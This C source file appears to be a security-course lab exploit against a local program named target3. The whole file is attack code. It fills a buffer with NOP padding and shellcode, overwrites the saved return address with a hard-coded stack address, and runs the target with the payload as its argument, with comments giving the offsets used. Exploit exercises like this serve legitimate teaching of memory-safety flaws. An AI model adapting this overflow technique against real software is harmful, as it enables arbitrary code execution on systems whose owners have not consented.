#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

/* 
   &buf: 0x2021fe10 + 4
   rip: 0x2021fe58
   
   need to write at buf[72]
 */
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	char ex_str[128];
	memset(ex_str, '\x90', 128);

	strcpy(ex_str, shellcode);
	ex_str[strlen(ex_str)] = '\x90'; // remove '\0' char at the end of string

	strcpy(&ex_str[68], "\x10\xfe\x21\x20");

	args[0] = TARGET;
	args[1] = ex_str;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
